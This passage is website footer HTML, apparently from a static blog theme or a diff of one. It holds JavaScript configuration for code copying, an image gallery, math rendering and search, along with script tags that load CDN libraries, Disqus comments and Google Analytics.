type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.f51938f3065a40ee841bcb558e4330e31fd26c0ea55343fff8770b88b0319a3c.js" integrity="sha256-9Rk48wZaQO6EG8tVjkMw4x/SbA6lU0P/&#43;HcLiLAxmjw="></script><script type="text/javascript">
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/copy-tex.min.css"><script type="text/javascript" src="https://polyfill.io/v3/polyfill.min.js?features=Array.prototype.fill%2CArray.prototype.find%2CArray.from%2CIntersectionObserver%2CMath.sign%2CObject.assign%2CPromise%2CObject.entries%2Chtml5shiv%2CObject.values%2Cfetch%2CElement.prototype.after"></script><script type="text/javascript" src="https://team07even.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.c1d5acc03abc8af9ee0a42aa4e942566a338a3e29d21b6c9f11536101f6914ad.js" integrity="sha256-wdWswDq8ivnuCkKqTpQlZqM4o+KdIbbJ8RU2EB9pFK0="></script><script type="text/javascript">
             window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
             gtag('config', 'UA-174974975-1', { 'anonymize_ip': true });
         </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=UA-174974975-1" async></script></body>
